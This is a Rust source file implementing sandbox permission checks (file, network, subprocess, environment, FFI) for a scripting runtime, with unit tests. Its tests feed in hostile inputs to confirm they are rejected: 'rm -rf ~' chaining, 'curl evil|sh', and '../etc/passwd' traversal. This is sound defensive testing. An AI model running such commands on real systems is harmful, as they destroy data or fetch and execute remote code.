//! Capability-based sandboxing permissions for filesystem, network,
//! subprocess execution, and environment access.

use std::path::{Component, Path, PathBuf};

/// Access policy for a capability category.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PermissionScope {
    DenyAll,
    AllowAll,
    AllowList(Vec<String>),
}

/// Runtime permission set enforced by host natives (`fs`, `http`, `net`,
/// `os`, `require`) and, through the extension API, native packages.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Permissions {
    pub read: PermissionScope,
    pub write: PermissionScope,
    pub net: PermissionScope,
    pub run: PermissionScope,
    pub env: PermissionScope,
    pub ffi: PermissionScope,
}

impl Default for Permissions {
    fn default() -> Self {
        Self::allow_all()
    }
}

impl Permissions {
    /// Unrestricted permissions (default for standard CLI execution).
    pub fn allow_all() -> Self {
        Self {
            read: PermissionScope::AllowAll,
            write: PermissionScope::AllowAll,
            net: PermissionScope::AllowAll,
            run: PermissionScope::AllowAll,
            env: PermissionScope::AllowAll,
            ffi: PermissionScope::AllowAll,
        }
    }

    /// Fully sandboxed permissions (all host capabilities denied).
    pub fn deny_all() -> Self {
        Self {
            read: PermissionScope::DenyAll,
            write: PermissionScope::DenyAll,
            net: PermissionScope::DenyAll,
            run: PermissionScope::DenyAll,
            env: PermissionScope::DenyAll,
            ffi: PermissionScope::DenyAll,
        }
    }

    pub fn with_read(mut self, scope: PermissionScope) -> Self {
        self.read = scope;
        self
    }

    pub fn with_write(mut self, scope: PermissionScope) -> Self {
        self.write = scope;
        self
    }

    pub fn with_net(mut self, scope: PermissionScope) -> Self {
        self.net = scope;
        self
    }

    pub fn with_run(mut self, scope: PermissionScope) -> Self {
        self.run = scope;
        self
    }

    pub fn with_env(mut self, scope: PermissionScope) -> Self {
        self.env = scope;
        self
    }

    pub fn with_ffi(mut self, scope: PermissionScope) -> Self {
        self.ffi = scope;
        self
    }

    /// Checks whether reading `path` is permitted.
    pub fn check_read(&self, path: &str) -> Result<(), String> {
        check_path_scope(&self.read, path)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: read access to '{}', run with --allow-read",
                    path
                )
            })
    }

    /// Checks whether writing or modifying `path` is permitted.
    pub fn check_write(&self, path: &str) -> Result<(), String> {
        check_path_scope(&self.write, path)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: write access to '{}', run with --allow-write",
                    path
                )
            })
    }

    /// Checks whether network access to `target` (URL, `host:port`, or host)
    /// is permitted.
    pub fn check_net(&self, target: &str) -> Result<(), String> {
        check_net_scope(&self.net, target)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: network access to '{}', run with --allow-net",
                    target
                )
            })
    }

    /// Checks whether spawning a shell command string (`sh -c` / `cmd /C`) is permitted.
    ///
    /// When `--allow-run` is restricted to an allow-list, shell strings are rejected
    /// outright to prevent metacharacter/command-chaining bypasses; callers must use
    /// the array form `{ program, arg1, ... }` instead.
    pub fn check_run_shell(&self, cmd: &str) -> Result<(), String> {
        match &self.run {
            PermissionScope::AllowAll => Ok(()),
            PermissionScope::DenyAll => Err(format!(
                "permission denied: subprocess execution of '{}', run with --allow-run",
                cmd
            )),
            PermissionScope::AllowList(_) => Err(format!(
                "permission denied: shell command string '{}' cannot be used with a restricted --allow-run allow-list; pass an array {{ program, arg1, ... }} instead",
                cmd
            )),
        }
    }

    /// Checks whether spawning subprocess `program` (without shell interpolation) is permitted.
    pub fn check_run(&self, program: &str) -> Result<(), String> {
        check_run_scope(&self.run, program)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: subprocess execution of '{}', run with --allow-run",
                    program
                )
            })
    }

    /// Checks that `program` may run and returns exactly what must be handed to
    /// `Command::new`.
    ///
    /// Under `AllowAll` the string is returned unchanged (the child resolves it as
    /// usual). Under an allow-list the program is resolved to an absolute path
    /// *here*: a bare name is searched on the parent process `PATH` (honouring
    /// `PATHEXT` on Windows) and a path spec is made absolute against the current
    /// directory. Spawning that path means a `PATH` or `cwd` set for the child
    /// cannot redirect the name that was checked to a different binary.
    pub fn resolve_run_program(&self, program: &str) -> Result<PathBuf, String> {
        self.check_run(program)?;
        if !matches!(self.run, PermissionScope::AllowList(_)) {
            return Ok(PathBuf::from(program));
        }
        let cwd = std::env::current_dir()
            .map_err(|e| format!("cannot determine current directory: {}", e))?;
        if is_path_spec(program) {
            // The same resolution `check_run` compared against the allow-list.
            return Ok(resolve_path(program));
        }
        find_on_path(program, &cwd).ok_or_else(|| {
            format!(
                "program '{}' not found in PATH of the parent process",
                program
            )
        })
    }

    /// Checks whether connecting to a Unix domain socket at `path` is permitted.
    pub fn check_net_unix(&self, path: &str) -> Result<(), String> {
        check_unix_socket_scope(&self.net, path)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: unix socket access to '{}', run with --allow-net",
                    path
                )
            })
    }

    /// Checks whether connecting to a named pipe (or Unix socket on non-Windows) is permitted.
    pub fn check_net_pipe(&self, name: &str) -> Result<(), String> {
        if !cfg!(windows) {
            return self.check_net_unix(name);
        }
        check_pipe_scope(&self.net, name)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: named pipe access to '{}', run with --allow-net",
                    name
                )
            })
    }

    /// Checks whether reading environment variable `var` is permitted.
    pub fn check_env(&self, var: &str) -> Result<(), String> {
        check_env_scope(&self.env, var)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: environment access to '{}', run with --allow-env",
                    var
                )
            })
    }

    /// Checks whether loading native library or FFI extension `path` is permitted.
    pub fn check_ffi(&self, path: &str) -> Result<(), String> {
        check_path_scope(&self.ffi, path)
            .then_some(())
            .ok_or_else(|| {
                format!(
                    "permission denied: FFI / native extension access to '{}', run with --allow-ffi",
                    path
                )
            })
    }

    /// Checks that library or extension `path` may be loaded and returns exactly
    /// what must be handed to the dynamic loader.
    ///
    /// Under `AllowAll` the string is returned unchanged (search-path loading and
    /// the empty path, i.e. the host process itself, keep working). Under an
    /// allow-list the empty path is refused (it exposes the whole process,
    /// libc included), and the path is resolved here: it must name an existing
    /// file inside the allow-list, and the resolved absolute path is returned so
    /// `dlopen` cannot fall back to its own search path.
    pub fn resolve_ffi_library(&self, path: &str) -> Result<PathBuf, String> {
        match &self.ffi {
            PermissionScope::AllowAll => Ok(PathBuf::from(path)),
            PermissionScope::DenyAll => self.check_ffi(path).map(|_| PathBuf::new()),
            PermissionScope::AllowList(_) => {
                if path.is_empty() {
                    return Err("permission denied: loading the host process itself (ffi.open(nil)) requires unrestricted --allow-ffi".to_string());
                }
                self.check_ffi(path)?;
                let resolved = resolve_path(path);
                if !resolved.is_file() {
                    return Err(format!(
                        "permission denied: FFI library '{}' is not an existing file; under a restricted --allow-ffi libraries must be given as a path to a file inside the allow-list (no search-path loading)",
                        path
                    ));
                }
                self.check_ffi(&resolved.to_string_lossy())?;
                Ok(resolved)
            }
        }
    }

    /// Checks whether in-process FFI memory helpers (`ffi.alloc`, `free`, `read`, `write`)
    /// are permitted. Any non-`DenyAll` FFI policy (`AllowAll` or an explicit library
    /// allow-list) permits these memory operations.
    pub fn check_ffi_memory(&self) -> Result<(), String> {
        match &self.ffi {
            PermissionScope::AllowAll | PermissionScope::AllowList(_) => Ok(()),
            PermissionScope::DenyAll => {
                Err("permission denied: FFI memory operations, run with --allow-ffi".to_string())
            }
        }
    }

    /// Checks whether dereferencing raw foreign pointers (`ffi.readUnsafe`,
    /// `ffi.writeUnsafe`, `ffi.readCStringUnsafe`) is permitted. These can touch
    /// any address in the process (including the permission set itself), so they
    /// require unrestricted `--allow-ffi`; an allow-list is not enough.
    pub fn check_ffi_unsafe_memory(&self) -> Result<(), String> {
        match &self.ffi {
            PermissionScope::AllowAll => Ok(()),
            PermissionScope::AllowList(_) => Err("permission denied: unchecked FFI memory access (readUnsafe, writeUnsafe, readCStringUnsafe) requires unrestricted --allow-ffi".to_string()),
            PermissionScope::DenyAll => {
                Err("permission denied: FFI memory operations, run with --allow-ffi".to_string())
            }
        }
    }
}

fn is_executable_file(p: &Path) -> bool {
    let Ok(meta) = std::fs::metadata(p) else {
        return false;
    };
    if !meta.is_file() {
        return false;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        meta.permissions().mode() & 0o111 != 0
    }
    #[cfg(not(unix))]
    {
        true
    }
}

/// Searches the parent process `PATH` for `name`, returning an absolute path.
fn find_on_path(name: &str, cwd: &Path) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    let mut names = vec![name.to_string()];
    if cfg!(windows) {
        let exts = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".into());
        for ext in exts.split(';').filter(|e| !e.is_empty()) {
            names.push(format!("{}{}", name, ext));
        }
    }
    for dir in std::env::split_paths(&path) {
        let dir = if dir.as_os_str().is_empty() {
            cwd.to_path_buf()
        } else if dir.is_absolute() {
            dir
        } else {
            cwd.join(dir)
        };
        for n in &names {
            let candidate = dir.join(n);
            if is_executable_file(&candidate) {
                return Some(candidate);
            }
        }
    }
    None
}

/// Normalizes a path lexically against `current_dir` without touching the filesystem.
fn normalize_abs_lexical(p: &Path) -> PathBuf {
    let abs = if p.is_absolute() {
        p.to_path_buf()
    } else if let Ok(cwd) = std::env::current_dir() {
        cwd.join(p)
    } else {
        p.to_path_buf()
    };
    let mut out = PathBuf::new();
    for comp in abs.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => {
                if !matches!(
                    out.components().next_back(),
                    Some(Component::RootDir | Component::Prefix(_))
                ) {
                    out.pop();
                }
            }
            other => out.push(other),
        }
    }
    out
}

/// Resolves symlinks along existing path prefixes so symlink traversal inside an
/// allow-listed directory cannot escape outside it, even when the final leaf
/// does not exist yet.
fn resolve_path(raw: &str) -> PathBuf {
    resolve_path_depth(Path::new(raw), 0)
}

fn resolve_path_depth(p: &Path, depth: u8) -> PathBuf {
    let abs = if p.is_absolute() {
        p.to_path_buf()
    } else if let Ok(cwd) = std::env::current_dir() {
        cwd.join(p)
    } else {
        p.to_path_buf()
    };

    let mut cur = PathBuf::new();
    for comp in abs.components() {
        match comp {
            Component::Prefix(_) | Component::RootDir => cur.push(comp),
            Component::CurDir => {}
            Component::ParentDir => {
                if !matches!(
                    cur.components().next_back(),
                    Some(Component::RootDir | Component::Prefix(_))
                ) {
                    cur.pop();
                }
            }
            Component::Normal(seg) => {
                cur.push(seg);
                if let Ok(meta) = std::fs::symlink_metadata(&cur) {
                    if let Ok(canon) = std::fs::canonicalize(&cur) {
                        cur = canon;
                    } else if meta.file_type().is_symlink()
                        && depth < 16
                        && let Ok(target) = std::fs::read_link(&cur)
                    {
                        let base = cur.parent().unwrap_or_else(|| Path::new("/"));
                        let joined = if target.is_absolute() {
                            target
                        } else {
                            base.join(target)
                        };
                        cur = resolve_path_depth(&joined, depth + 1);
                    }
                }
            }
        }
    }
    if cur.as_os_str().is_empty() {
        normalize_abs_lexical(p)
    } else {
        cur
    }
}

fn check_path_scope(scope: &PermissionScope, target: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => {
            let target_resolved = resolve_path(target);
            allowed.iter().any(|prefix| {
                let prefix_resolved = resolve_path(prefix);
                target_resolved.starts_with(&prefix_resolved)
            })
        }
    }
}

/// Extracts `(host, optional_port)` from a URL or `host[:port]` string.
fn extract_host_port(target: &str) -> (&str, Option<&str>) {
    let without_scheme = target
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(target);
    let authority = without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme);
    let authority = authority
        .rsplit_once('@')
        .map(|(_, host)| host)
        .unwrap_or(authority);
    if let Some(rest) = authority.strip_prefix('[')
        && let Some((ipv6, after)) = rest.split_once(']')
    {
        let port = after.strip_prefix(':');
        return (ipv6, port);
    }
    match authority.rsplit_once(':') {
        Some((h, p)) if !h.is_empty() && p.chars().all(|c| c.is_ascii_digit()) => (h, Some(p)),
        _ => (authority, None),
    }
}

fn check_net_scope(scope: &PermissionScope, target: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => {
            let (t_host, t_port) = extract_host_port(target);
            let t_host_lower = t_host.to_ascii_lowercase();
            allowed.iter().any(|rule| {
                let (r_host, r_port) = extract_host_port(rule);
                if let Some(rp) = r_port
                    && t_port != Some(rp)
                {
                    return false;
                }
                let r_host_lower = r_host.to_ascii_lowercase();
                if let Some(suffix) = r_host_lower.strip_prefix("*.") {
                    t_host_lower == suffix || t_host_lower.ends_with(&format!(".{}", suffix))
                } else {
                    t_host_lower == r_host_lower
                }
            })
        }
    }
}

fn is_path_spec(s: &str) -> bool {
    s.contains('/') || s.contains('\\') || Path::new(s).is_absolute()
}

fn check_unix_socket_scope(scope: &PermissionScope, path: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => {
            let target_resolved = resolve_path(path);
            allowed.iter().any(|rule| {
                if let Some(socket_rule) = rule.strip_prefix("unix:") {
                    resolve_path(socket_rule) == target_resolved
                } else {
                    is_path_spec(rule) && resolve_path(rule) == target_resolved
                }
            })
        }
    }
}

fn check_pipe_scope(scope: &PermissionScope, name: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => allowed.iter().any(|rule| {
            let rule_name = rule.strip_prefix("pipe:").unwrap_or(rule);
            if cfg!(windows) {
                rule_name.eq_ignore_ascii_case(name)
            } else {
                rule_name == name
            }
        }),
    }
}

fn check_run_scope(scope: &PermissionScope, program: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => {
            if program.is_empty() {
                return false;
            }
            let prog_is_path = is_path_spec(program);
            allowed.iter().any(|item| {
                if is_path_spec(item) {
                    prog_is_path && resolve_path(program) == resolve_path(item)
                } else if prog_is_path {
                    false
                } else if cfg!(windows) {
                    item.eq_ignore_ascii_case(program)
                } else {
                    item == program
                }
            })
        }
    }
}

fn check_env_scope(scope: &PermissionScope, var: &str) -> bool {
    match scope {
        PermissionScope::AllowAll => true,
        PermissionScope::DenyAll => false,
        PermissionScope::AllowList(allowed) => allowed.iter().any(|item| {
            if cfg!(windows) {
                item.eq_ignore_ascii_case(var)
            } else {
                item == var
            }
        }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deny_all_blocks_everything() {
        let perms = Permissions::deny_all();
        assert!(perms.check_read("foo.txt").is_err());
        assert!(perms.check_write("foo.txt").is_err());
        assert!(perms.check_net("https://example.com").is_err());
        assert!(perms.check_run("ls").is_err());
        assert!(perms.check_env("HOME").is_err());
    }

    #[test]
    fn test_read_allow_list_blocks_traversal() {
        let perms =
            Permissions::deny_all().with_read(PermissionScope::AllowList(vec!["/tmp/safe".into()]));
        assert!(perms.check_read("/tmp/safe/data.txt").is_ok());
        assert!(perms.check_read("/tmp/safe/../etc/passwd").is_err());
        assert!(perms.check_read("/etc/passwd").is_err());
    }

    #[test]
    fn test_net_allow_list_matches_hosts_ports_and_wildcards() {
        let perms = Permissions::deny_all().with_net(PermissionScope::AllowList(vec![
            "api.example.com".into(),
            "localhost:8080".into(),
            "*.trusted.org".into(),
        ]));
        assert!(perms.check_net("https://api.example.com/v1/users").is_ok());
        assert!(perms.check_net("localhost:8080").is_ok());
        assert!(perms.check_net("localhost:9090").is_err());
        assert!(perms.check_net("https://sub.trusted.org/data").is_ok());
        assert!(perms.check_net("https://evil.com").is_err());
    }

    #[test]
    fn test_run_and_env_allow_lists() {
        let perms = Permissions::deny_all()
            .with_run(PermissionScope::AllowList(vec![
                "echo".into(),
                "/usr/bin/git".into(),
            ]))
            .with_env(PermissionScope::AllowList(vec!["PATH".into()]));

        // Array-form direct binary allowed; shell strings & path spoofing rejected.
        assert!(perms.check_run("echo").is_ok());
        assert!(perms.check_run_shell("echo hello").is_err());
        assert!(perms.check_run_shell("echo hi; rm -rf ~").is_err());
        assert!(perms.check_run_shell("echo $(curl evil|sh)").is_err());
        assert!(perms.check_run_shell("echo x | sh").is_err());
        assert!(perms.check_run("/tmp/evil/echo").is_err());

        // Path allow-list entry matches canonical full path only, not basename.
        assert!(perms.check_run("/usr/bin/git").is_ok());
        assert!(perms.check_run("/tmp/evil/git").is_err());
        assert!(perms.check_run("git").is_err());
        assert!(perms.check_run("rm").is_err());

        assert!(perms.check_env("PATH").is_ok());
        assert!(perms.check_env("SECRET_KEY").is_err());
    }

    #[cfg(unix)]
    #[test]
    fn test_read_allow_list_blocks_symlink_escape() {
        let base = std::env::temp_dir().join(format!("neyuki_sym_test_{}", std::process::id()));
        let safe_dir = base.join("safe");
        let outside_dir = base.join("outside");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&safe_dir).unwrap();
        std::fs::create_dir_all(&outside_dir).unwrap();
        let secret = outside_dir.join("secret.txt");
        std::fs::write(&secret, b"top-secret").unwrap();

        let escape_link = safe_dir.join("link_out");
        std::os::unix::fs::symlink(&outside_dir, &escape_link).unwrap();

        let perms = Permissions::deny_all().with_read(PermissionScope::AllowList(vec![
            safe_dir.to_string_lossy().into_owned(),
        ]));
        assert!(
            perms
                .check_read(&safe_dir.join("normal.txt").to_string_lossy())
                .is_ok()
        );
        assert!(
            perms
                .check_read(&escape_link.join("secret.txt").to_string_lossy())
                .is_err()
        );
        assert!(
            perms
                .check_read(&escape_link.join("nonexistent_new.txt").to_string_lossy())
                .is_err()
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn test_ffi_memory_scope_and_non_host_net_targets() {
        let ffi_perms = Permissions::deny_all()
            .with_ffi(PermissionScope::AllowList(vec!["/opt/lib/demo.so".into()]));
        assert!(ffi_perms.check_ffi("/opt/lib/demo.so").is_ok());
        assert!(ffi_perms.check_ffi("/tmp/evil.so").is_err());
        assert!(ffi_perms.check_ffi_memory().is_ok());

        let denied = Permissions::deny_all();
        assert!(denied.check_ffi_memory().is_err());

        let net_perms = Permissions::deny_all().with_net(PermissionScope::AllowList(vec![
            "api.example.com".into(),
            "unix:/tmp/allowed.sock".into(),
        ]));
        assert!(net_perms.check_net_unix("/tmp/allowed.sock").is_ok());
        assert!(net_perms.check_net_unix("/tmp/other.sock").is_err());
    }

    #[test]
    fn test_ffi_unsafe_memory_and_library_resolution() {
        let list = Permissions::deny_all()
            .with_ffi(PermissionScope::AllowList(vec!["/opt/lib/demo.so".into()]));
        assert!(list.check_ffi_unsafe_memory().is_err());
        assert!(list.check_ffi_memory().is_ok());
        assert!(Permissions::allow_all().check_ffi_unsafe_memory().is_ok());
        assert!(Permissions::deny_all().check_ffi_unsafe_memory().is_err());

        let cwd = Permissions::deny_all().with_ffi(PermissionScope::AllowList(vec![".".into()]));
        assert!(cwd.resolve_ffi_library("").is_err());
        assert!(cwd.resolve_ffi_library("libc.so.6").is_err());
        assert!(cwd.resolve_ffi_library("Cargo.toml").unwrap().is_absolute());
        let all = Permissions::allow_all();
        assert_eq!(
            all.resolve_ffi_library("libc.so.6").unwrap(),
            PathBuf::from("libc.so.6")
        );
        assert_eq!(all.resolve_ffi_library("").unwrap(), PathBuf::new());
    }

    #[cfg(unix)]
    #[test]
    fn test_resolve_run_program() {
        let perms = Permissions::deny_all().with_run(PermissionScope::AllowList(vec![
            "sh".into(),
            "./tools/x".into(),
        ]));
        let sh = perms.resolve_run_program("sh").unwrap();
        assert!(sh.is_absolute() && sh.ends_with("sh"));
        assert!(perms.resolve_run_program("ls").is_err());
        assert!(
            perms
                .resolve_run_program("./tools/x")
                .unwrap()
                .is_absolute()
        );
        let all = Permissions::allow_all();
        assert_eq!(
            all.resolve_run_program("git").unwrap(),
            PathBuf::from("git")
        );
    }
}
